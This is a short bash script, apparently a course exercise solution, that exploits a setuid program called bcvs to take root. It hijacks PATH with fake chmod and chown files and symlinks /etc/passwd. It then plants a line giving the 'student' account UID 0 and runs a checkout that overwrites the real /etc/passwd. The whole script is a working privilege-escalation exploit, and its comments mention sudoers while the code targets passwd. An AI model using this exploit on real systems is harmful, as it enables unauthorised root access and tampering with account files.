#!/usr/bin/bash
cd /opt/bcvs
#create two fake scripts for chmod and chown
touch chown
touch chmod

#change the PATH to look at the /opt/bcvs first
export  PATH=/opt/bcvs:$PATH 

#make fake directory and move all .bcvs into it. creates a fake block.list file in it.
mkdir /opt/bcvs/fake
chmod 777 /opt/bcvs/fake
mkdir /opt/bcvs/fake/.bcvs

cd /opt/bcvs
mv bcvs /opt/bcvs/fake
echo "/opt/bcvs/fake/.bcvs/block.list" > block.list
echo "Hello" >> block.list
echo "1"
mv block.list /opt/bcvs/fake/.bcvs/block.list
chmod go-rwx /opt/bcvs/fake/.bcvs/block.list

#create a symbolic link to /etc/sudoers file.
ln -s /etc/passwd passwd
echo "2"
mv passwd /opt/bcvs/fake

#create a fake sudoers file with a way to rewrite /etc/sudoer
cd /opt/bcvs/fake/.bcvs
touch passwd
echo "student:x:0:0::/root:/bin/bash" > passwd

#run bcvs, checking out sudoers
cd /opt/bcvs/fake
./bcvs co passwd
